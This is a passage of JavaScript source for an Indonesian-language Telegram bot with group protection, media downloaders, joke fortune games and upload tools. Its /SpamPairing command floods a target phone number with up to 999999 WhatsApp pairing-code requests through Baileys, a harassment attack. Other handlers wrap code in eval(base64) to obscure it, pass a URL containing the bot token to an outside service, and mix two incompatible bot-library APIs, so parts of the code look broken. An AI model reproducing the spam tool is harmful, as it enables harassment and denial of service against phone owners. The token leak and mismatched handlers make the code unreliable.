  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK 🚨
→ 📛 Grup : ${groupName}
→ 🆔 ID   : ${groupId}
——————
👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
//// Tools ///
bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Akaozik ( 📸 )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
 
// ========== COMMAND TIME (WIB, WITA, WIT) ==========
bot.command("time", async (ctx) => {
  const now = new Date();
  
  // WIB (UTC+7)
  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  
  // WITA (UTC+8)
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  
  // WIT (UTC+9)
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));
  
  // Format jam
  const formatJam = (date) => {
    return date.toLocaleTimeString("id-ID", { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit',
      hour12: false
    });
  };
  
  // Format tanggal
  const formatTanggal = (date) => {
    return date.toLocaleDateString("id-ID", { 
      weekday: 'long', 
      day: 'numeric', 
      month: 'long', 
      year: 'numeric' 
    });
  };
  
  const pesan = 
`
<blockquote>
🕐 WAKTU SEKARANG 🕐

┌─────────────────┐
│ 🟢 WIB 
│    ${formatJam(wib)}
│    ${formatTanggal(wib)}
├─────────────────┤
│ 🟡 WITA
│    ${formatJam(wita)}
│    ${formatTanggal(wita)}
├─────────────────┤
│ 🔵 WIT
│    ${formatJam(wit)}
│    ${formatTanggal(wit)}
└─────────────────┘

✨ *Ketikan /start untuk kembali menu utama* ✨
</blockquote>
`;
  
  await ctx.reply(pesan, { parse_mode: "HTML" });
}); 
 
bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("snack", async (ctx) => {
  const text = ctx.message.text;
  const url = text.split(" ")[1];

  if (!url) {
    return ctx.reply("Contoh:\n/snack https://s.snackvideo.com/xxxx");
  }

  // validasi link dikit biar ga asal masukin sampah
  if (!url.includes("snackvideo")) {
    return ctx.reply("❌ Itu bukan link SnackVideo, jangan ngawur");
  }

  try {
    await ctx.reply("⏳ Lagi diproses... sabar dikit napa");

    const res = await axios.get(
      `https://api.shecodes.io/snackvideo?url=${encodeURIComponent(url)}`,
      { timeout: 15000 } // biar ga ngegantung
    );

    const video = res?.data?.data?.video;

    if (!video) {
      return ctx.reply("❌ Gagal ambil video, kemungkinan API nya lagi ngambek");
    }

    await ctx.replyWithVideo(
      { url: video },
      {
        caption: "✅ Beres. Udah, jangan spam lagi"
      }
    );

  } catch (err) {
    console.log("ERROR:", err.message);

    ctx.reply("❌ Error. Bisa jadi:\n- API mati\n- Link lu aneh");
  }
});

bot.command(/\/gethtml(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = (match[1] || "").trim();

  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(
      chatId,
      "🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil source code dari URL...");

    const res = await axios.get(url, { responseType: "text", timeout: 30000 });
    const html = res.data;

    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    await bot.sendDocument(chatId, filePath, {}, { filename: "source_code.html", contentType: "text/html" });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ *Terjadi kesalahan:*\n\`${err.message}\``, { parse_mode: "Markdown" });
  }
});

// ========== CATBOX DOWNLOADER (VERSI SIMPLE) ==========

bot.command("catbox", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const url = args[1];
  
  if (!url) {
    return ctx.reply(
`📥 *DOWNLOAD CATBOX* 📥

*Cara pakai:*
/catbox https://files.catbox.moe/xxxxx.jpg

*Support file:*
Gambar, Video, Audio, Dokumen

📌 *Maksimal file: 50MB*`,
      { parse_mode: "Markdown" }
    );
  }
  
  if (!url.includes('files.catbox.moe')) {
    return ctx.reply("❌ Bukan URL Catbox yang valid!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengunduh file...*", { parse_mode: "Markdown" });
  
  try {
    // Kirim langsung pake URL
    const ext = url.split('.').pop().toLowerCase();
    
    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) {
      await ctx.replyWithPhoto(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) {
      await ctx.replyWithVideo(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp3', 'wav', 'ogg'].includes(ext)) {
      await ctx.replyWithAudio(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else {
      await ctx.replyWithDocument(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    }
  } catch (err) {
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", { parse_mode: "Markdown" });
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

// ========== CEK MASA DEPAN ==========
bot.command("cekmasadepan", async (ctx) => {
  let targetName = "Kamu";
  
  // Cek apakah reply ke pesan orang
  if (ctx.message.reply_to_message) {
    const target = ctx.message.reply_to_message.from;
    targetName = target.first_name || "Dia";
  } else {
    const args = ctx.message.text.split(" ");
    if (args.length > 1) {
      targetName = args.slice(1).join(" ");
    }
  }
  
  // Data random
  const profesi = [
    "Programmer Handal 💻", "Pengusaha Sukses 🏢", "Dokter Hebat 🏥", 
    "YouTuber Terkenal 📹", "Polisi Berdedikasi 👮", "Guru Inspiratif 📚",
    "Artis Ternama 🎬", "Atlet Profesional 🏆", "Pilot Handal ✈️",
    "Chef Michelin 🍳", "Desainer Grafis 🎨", "Wirausaha Muda 🚀"
  ];
  
  const kekayaan = [
    "Miliarder 💰💰💰", "Mapan Banget 🏦", "Berkecukupan 💵",
    "Kaya Raya 👑", "Sukses Finansial 📈", "Harta Melimpah 💎",
    "Hidup Nyaman 🏠", "Tabungan Banyak 🏦"
  ];
  
  const jodoh = [
    "Cantik/Ganteng 💕", "Setia ❤️", "Pengertian 🌸",
    "Lucu dan Romantis 🥰", "Baik Hati 💗", "Sederhana Tapi Bahagia 😊",
    "Kaya Raya 💰", "Soulmate Sejati ✨", "Pendamping Hidup 🤵"
  ];
  
  const rumah = [
    "Mewah di Jakarta 🏰", "Minimalis di Bali 🏡", "Modern di Bandung 🏘️",
    "Nyaman di Kampung 🌳", "Villa di Puncak ⛰️", "Apartemen di Surabaya 🏙️",
    "Rumah Impian ✨", "Kontrakan Dulu 😅"
  ];
  
  const kendaraan = [
    "Pajero Sport 🚙", "Alphard Hitam 🚐", "Tesla Listrik ⚡",
    "Motor Matic aja 🛵", "BMW Mewah 🚗", "Mercedes Benz 🏎️",
    "Helikopter Pribadi 🚁", "Naik Angkot 😂"
  ];
  
  const nasib = [
    "Sukses Besar! 🎉", "Hidup Bahagia 😊", "Menjadi Orang Tua Sukses 👨‍👩‍👧",
    "Pensiun Muda 🏖️", "Hidup Sederhana Bahagia 🌿", "Jadi Inspirasi Banyak Orang ✨",
    "Hidup Berkah 🙏", "Terkenal Seantero Negeri 🌍"
  ];
  
  // Random pilih
  const hasilProfesi = profesi[Math.floor(Math.random() * profesi.length)];
  const hasilKekayaan = kekayaan[Math.floor(Math.random() * kekayaan.length)];
  const hasilJodoh = jodoh[Math.floor(Math.random() * jodoh.length)];
  const hasilRumah = rumah[Math.floor(Math.random() * rumah.length)];
  const hasilKendaraan = kendaraan[Math.floor(Math.random() * kendaraan.length)];
  const hasilNasib = nasib[Math.floor(Math.random() * nasib.length)];
  
  const pesan = 
`
<blockquote>
🔮 RAMALAN MASA DEPAN 🔮
Untuk: ${targetName}

━━━━━━━━━━━━━━━━━━━━━━

👔 Profesi: ${hasilProfesi}
💰 Kekayaan: ${hasilKekayaan}
❤️ Jodoh: ${hasilJodoh}
🏠 Rumah: ${hasilRumah}
🚗 Kendaraan: ${hasilKendaraan}
🍀 Nasib:  ${hasilNasib}

━━━━━━━━━━━━━━━━━━━━━━
✨ Hasil ini hanya hiburan ya!
💪 Masa depan ada di tanganmu sendiri!

🔮 Ketik /cekmasadepan [nama] untuk coba lagi</blockquote>`;

  ctx.reply(pesan, { parse_mode: "HTML" });
});

// COMMAND SINGKAT (opsional)
bot.command("ramal", async (ctx) => {
  const args = ctx.message.text.split(" ");
  let nama = "Kamu";
  if (args.length > 1) nama = args.slice(1).join(" ");
  
  const hasil = [
    "Sukses besar di usia 30an! 🎉",
    "Jadi pengusaha terkenal! 🏢",
    "Punya pasangan idaman! ❤️",
    "Hidup bahagia sampai tua! 😊",
    "Bisa beli rumah mewah! 🏰",
    "Keliling dunia bareng keluarga! 🌍",
    "Jadi orang yang bermanfaat! ✨"
  ];
  
  const random = hasil[Math.floor(Math.random() * hasil.length)];
  ctx.reply(`🔮 *Ramalan untuk ${nama}:*\n\n✨ ${random}\n\n🔮 *Ketik /ramal [nama] lagi!*`, { parse_mode: "HTML" });
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
// ========== CEK CUACA (HIBURAN) ==========
bot.command("cuaca", async (ctx) => {
  const kondisi = [
    "Cerah ☀️", "Berawan 🌥️", "Hujan Ringan 🌦️", "Hujan Lebat 🌧️",
    "Badai ⛈️", "Mendung 🌫️", "Panas Terik 🔥", "Dingin 🥶"
  ];
  
  const suhu = Math.floor(Math.random() * 20) + 20; // 20-40°C
  const kelembaban = Math.floor(Math.random() * 50) + 40; // 40-90%
  const randomKondisi = kondisi[Math.floor(Math.random() * kondisi.length)];
  
  ctx.reply(
`
<blockquote>
🌤️ PRAKIRAAN CUACA*l 🌤️

📌 Kondisi: ${randomKondisi}
🌡️ Suhu: ${suhu}°C
💧 Kelembaban: ${kelembaban}%
💨 Angin: ${Math.floor(Math.random() * 20) + 5} km/jam

✨ Perkiraan ini hanya hiburan ya!
🔮 Cuaca sebenarnya bisa berbeda</blockquote>`,
    { parse_mode: "HTML" }
  );
});
// ========== UPLOAD KE TELEGRAPH (GAMPANG & PASTI JALAN) ==========
bot.command("catboxurl", async (ctx) => {
  // Cek reply foto
  if (!ctx.message.reply_to_message) {
    return ctx.reply(
`📸 UPLOAD GAMBAR 📸

Cara pakai:
1. Kirim foto
2. Reply foto itu
3. Ketik /catboxurl

✅ Gratis, cepat, permanen!`,
      { parse_mode: "Markdown" }
    );
  }
  
  let fileId = null;
  let replied = ctx.message.reply_to_message;
  
  if (replied.photo) {
    fileId = replied.photo[replied.photo.length - 1].file_id;
  } else if (replied.document && replied.document.mime_type?.startsWith('image/')) {
    fileId = replied.document.file_id;
  } else {
    return ctx.reply("❌ Harus berupa foto!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengupload...*", { parse_mode: "Markdown" });
  
  try {
    // Dapatkan file dari Telegram
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    
    // Upload ke Telegraph
    const postData = JSON.stringify([{ url: fileUrl }]);
    
    const options = {
      hostname: 'telegra.ph',
      path: '/upload',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    const request = https.request(options, (response) => {
      let data = '';
      response.on('data', (chunk) => { data += chunk; });
      response.on('end', () => {
        try {
          const result = JSON.parse(data);
          if (result[0] && result[0].src) {
            ctx.reply(
`✅ Upload Berhasil! ✅

🔗 Link: https://telegra.ph${result[0].src}

📌 Klik link untuk lihat gambar
💾 Link permanent!`,
              { parse_mode: "Markdown" }
            );
          } else {
            ctx.reply("❌ Gagal upload! Coba lagi.", { parse_mode: "Markdown" });
          }
        } catch (err) {
          ctx.reply("❌ Error parsing response!", { parse_mode: "Markdown" });
        }
      });
    });
    
    request.write(postData);
    request.end();
    
  } catch (err) {
    ctx.reply("❌ Terjadi kesalahan!", { parse_mode: "Markdown" });
  }
});
// ========== ENKRIPSI KODE JS (NO ERROR - FIX) ==========

function simpleEncode(code) {
  let encoded = Buffer.from(code).toString('base64');
  return `eval(Buffer.from('${encoded}', 'base64').toString())`;
}

function simpleDecode(encrypted) {
  try {
    let match = encrypted.match(/Buffer\.from\('(.*?)',\s*'base64'\)/);
    if (match) {
      return Buffer.from(match[1], 'base64').toString();
    }
    return null;
  } catch(e) {
    return null;
  }
}

// COMMAND ENKRIPSI (FIX REPLY)
bot.command("encjs", (ctx) => {
  let code = "";
  
  // PRIORITAS: Ambil dari reply
  if (ctx.message.reply_to_message) {
    let replied = ctx.message.reply_to_message;
    if (replied.text) {
      code = replied.text;
    } else if (replied.caption) {
      code = replied.caption;
    }
  }
  
  // Jika tidak ada reply, ambil dari argumen
  if (!code) {
    let args = ctx.message.text.split(" ");
    args.shift();
    code = args.join(" ");
  }
  
  // Jika masih kosong, tampilkan bantuan
  if (!code.trim()) {
    return ctx.reply(
`🔒 *ENKRIPSI KODE JS* 🔒

📌 *Cara pakai:*
• /encjs console.log("Halo")
• Atau *reply* pesan yang berisi kode, lalu ketik /encjs

✅ *Contoh:*
[Kamu kirim pesan: console.log("test")]
[Lalu reply pesan itu dengan /encjs]`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleEncode(code);
  
  ctx.reply(
`🔐 *KODE TERPROTEKSI* 🔐

\`\`\`javascript
${hasil}
\`\`\`

📌 *Simpan kode asli!*`,
    { parse_mode: "Markdown" }
  );
});

// COMMAND DEKRIPSI
bot.command("decjs", (ctx) => {
  let encrypted = "";
  
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) {
    encrypted = ctx.message.reply_to_message.text;
  } else {
    let args = ctx.message.text.split(" ");
    args.shift();
    encrypted = args.join(" ");
  }
  
  if (!encrypted.trim()) {
    return ctx.reply(
`🔓 *DEKRIPSI KODE JS* 🔓

📌 *Cara pakai:*
Reply pesan yang berisi kode terenkripsi, lalu ketik /decjs`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleDecode(encrypted);
  
  if (hasil) {
    ctx.reply(
`🔓 *KODE ASLI* 🔓

\`\`\`javascript
${hasil}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  } else {
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", { parse_mode: "Markdown" });
  }
});
/// ========== TOOLS SPAM PAIRING =======\\\
bot.command(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});
// ========== 10 TOOLS SERU-SERUAN ==========

// 1. Cek Jodoh (random)
bot.command("jodoh", (ctx) => {
  const persen = Math.floor(Math.random() * 100) + 1;
  const status = persen > 70 ? "Cocok banget! 💖" : (persen > 40 ? "Bisa jadi 😊" : "Kurang cocok 😅");
  ctx.reply(`💘 *Cek Jodoh*\nKecocokan: ${persen}%\nStatus: ${status}`, { parse_mode: "Markdown" });
});

// 2. Ramalan Shio (random)
bot.command("shio", (ctx) => {
  const ramalan = ["Hoki besar 🍀", "Lumayan beruntung ✨", "Biasa aja 😶", "Kurang bagus 😕", "Sial dikit 🤣"];
  const random = ramalan[Math.floor(Math.random() * ramalan.length)];
  ctx.reply(`🐉 *Ramalan Shio hari ini:* ${random}`, { parse_mode: "Markdown" });
});

// 3. Tebak Angka (game)
let tebakAngka = {};
bot.command("tebak", (ctx) => {
  const userId = ctx.from.id;
  if (!tebakAngka[userId]) {
    tebakAngka[userId] = Math.floor(Math.random() * 10) + 1;
    return ctx.reply("🎲 *Tebak Angka (1-10)*\nKetik /tebak [angka]\nContoh: /tebak 5", { parse_mode: "Markdown" });
  }
  const args = ctx.message.text.split(" ");
  const tebakan = parseInt(args[1]);
  if (isNaN(tebakan)) return ctx.reply("Masukkan angka 1-10!");
  if (tebakan === tebakAngka[userId]) {
    ctx.reply("🎉 *Benar!* Selamat! 🎉\nKetik /tebak lagi untuk main baru.");
    delete tebakAngka[userId];
  } else {
    ctx.reply(`❌ Salah! Angka rahasianya bukan ${tebakan}. Coba lagi.`);
  }
});

// 4. Kata Motivasi random
bot.command("motivasi", (ctx) => {
  const quotes = [
    "✨ Jangan menyerah, hari ini berat besok mungkin indah.",
    "💪 Sukses dimulai dari keberanian untuk memulai.",
    "🌟 Percaya sama diri sendiri, itu kunci utama.",
    "🌱 Proses tidak akan mengkhianati hasil.",
    "🚀 Bermimpilah tinggi, lalu kejar!"
  ];
  const random = quotes[Math.floor(Math.random() * quotes.length)];
  ctx.reply(`💡 *Motivasi:* ${random}`, { parse_mode: "Markdown" });
});

// 5. Batu-gunting-kertas (suit)
bot.command("suit", (ctx) => {
  const pilihan = ["batu", "gunting", "kertas"];
  const user = ctx.message.text.split(" ")[1]?.toLowerCase();
  if (!user || !pilihan.includes(user)) return ctx.reply("Pilih: /suit batu | gunting | kertas");
  const botChoice = pilihan[Math.floor(Math.random() * 3)];
  let hasil = "";
  if (user === botChoice) hasil = "Seri 🤝";
  else if (
    (user === "batu" && botChoice === "gunting") ||
    (user === "gunting" && botChoice === "kertas") ||
    (user === "kertas" && botChoice === "batu")
  ) hasil = "Kamu menang! 🎉";
  else hasil = "Bot menang! 😭";
  ctx.reply(`✊ Kamu: ${user}\n🤖 Bot: ${botChoice}\n${hasil}`);
});

// 6. Cek kepribadian dari nama (random)
bot.command("kepribadian", (ctx) => {
  const sifat = ["Pemberani 🦁", "Pintar 🧠", "Baik hati 💖", "Lucu 😂", "Penyabar 🧘", "Kreatif 🎨"];
  const random = sifat[Math.floor(Math.random() * sifat.length)];
  ctx.reply(`🧠 *Kepribadianmu:* ${random}`, { parse_mode: "Markdown" });
});

// 7. Ramalan karir random
bot.command("karir", (ctx) => {
  const karir = ["Programmer 💻", "Pengusaha 🏢", "Dokter 🩺", "Guru 📚", "Artis 🎬", "Atlet ⚽"];
  const random = karir[Math.floor(Math.random() * karir.length)];
  ctx.reply(`💼 *Karir masa depanmu:* ${random}`, { parse_mode: "Markdown" });
});

// 8. Cek level ganteng/cantik (random)
bot.command("level", (ctx) => {
  const level = Math.floor(Math.random() * 100) + 1;
  let status = level > 80 ? "Level Dewa/ Dewi 😎" : (level > 50 ? "Cukup menawan 😊" : "Biasa saja 🤭");
  ctx.reply(`📊 *Level ketampanan/kecantikan:* ${level}%\n${status}`, { parse_mode: "Markdown" });
});

// 9. Tebak hari lahir (seru-seruan)
bot.command("harilahir", (ctx) => {
  const hari = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"];
  const random = hari[Math.floor(Math.random() * hari.length)];
  ctx.reply(`🎂 *Hari lahir versi random:* Kamu lahir hari ${random}. (Hanya hiburan)`, { parse_mode: "Markdown" });
});

// 10. Game lempar koin
bot.command("koin", (ctx) => {
  const hasil = Math.random() < 0.5 ? "Kepala 🪙" : "Ekor 💰";
  ctx.reply(`🪙 *Hasil lempar koin:* ${hasil}`, { parse_mode: "Markdown" });
});
// ========== PENCARIAN LAGU (DEEZER) ==========
// Command: /lagu [judul lagu]

bot.command("lagu", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply("🎵 Cara pakai: /lagu [judul lagu]\nContoh: /lagu blur song 2", { parse_mode: "Markdown" });
  }

  const status = await ctx.reply(`🔍 *Mencari: ${query}`, { parse_mode: "Markdown" });

  try {
    const res = await fetch(`https://api.deezer.com/search?q=${encodeURIComponent(query)}&limit=1`);
    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `❌ Lagu "${query}" tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const track = data.data[0];
    const judul = track.title;
    const artis = track.artist.name;
    const preview = track.preview;
    const cover = track.album.cover_medium;
    const link = track.link;

    // Hapus pesan "mencari"
    await ctx.telegram.deleteMessage(ctx.chat.id, status.message_id).catch(() => {});

    // Kirim cover + info
    if (cover) {
      await ctx.replyWithPhoto(cover, {
        caption: `🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`,
        parse_mode: "Markdown"
      });
    } else {
      await ctx.reply(`🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`, { parse_mode: "Markdown" });
    }

    // Kirim audio preview jika ada
    if (preview && preview !== "null") {
      await ctx.replyWithAudio(preview, {
        title: judul,
        performer: artis,
        caption: "🎧 *Preview 30 detik*"
      });
    } else {
      await ctx.reply("⚠️ *Preview audio tidak tersedia untuk lagu ini.*", { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, "❌ Terjadi kesalahan. Coba lagi nanti.", { parse_mode: "Markdown" }).catch(() => {
      ctx.reply("❌ Terjadi kesalahan. Coba lagi nanti.");
    });
  }
});
// ========== FOTO JADI HD (UPSCALE) ==========
// Gunakan API PicWish (gratis, tanpa API key)

bot.command("hdphoto", async (ctx) => {
  // Cek apakah user reply ke sebuah foto
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply(
`📸 CARA PAKAI:\n1. Kirim foto ke bot\n2. Reply foto tersebut\n3. Ketik /hd\n\n✨ *Hasil: Foto akan di-upgrade ke resolusi lebih tinggi & lebih tajam!`
    );
  }

  const statusMsg = await ctx.reply("⏳ *Memproses foto...* (bisa makan waktu 10-20 detik mohon bersabar...)");

  try {
    // Ambil file ID foto dengan resolusi tertinggi
